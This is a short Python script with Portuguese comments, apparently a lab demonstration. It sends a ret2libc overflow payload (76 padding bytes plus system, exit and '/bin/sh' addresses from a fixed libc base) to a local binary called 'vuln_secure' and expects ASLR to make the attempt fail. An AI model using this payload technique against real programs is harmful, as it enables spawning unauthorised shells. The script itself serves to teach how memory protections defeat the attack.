# exploit_secure.py
"""
 Endereço base da libc (ASLR randomiza isso a cada execução)
 Em um sistema seguro, não conseguimos prever isso facilmente sem um leak.
 Para fins de demonstração, vamos tentar um endereço fixo que falhará.
"""
import struct
import sys
import subprocess
import time

def run_exploit():
    
    libc_base = 0xf7dc0000  
    
    system_offset = 0x0003d200
    exit_offset = 0x000303d0
    binsh_offset = 0x0017e0cf

    system_addr = struct.pack("<I", libc_base + system_offset)
    exit_addr = struct.pack("<I", libc_base + exit_offset)
    binsh_addr = struct.pack("<I", libc_base + binsh_offset)

    payload = b"A" * 76
    payload += system_addr
    payload += exit_addr
    payload += binsh_addr

    print(f"Tentando explorar com libc_base={hex(libc_base)}...")
    
    try:
        p = subprocess.Popen(["./vuln_secure", payload], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = p.communicate(timeout=1)
        
        if p.returncode == 0:
            print("Sucesso! (Inesperado em sistema seguro)")
        else:
            print("Falha (Esperado: Segfault ou proteção ativa)")
            
    except Exception as e:
        print(f"Erro na execução: {e}")

if __name__ == "__main__":
    run_exploit()
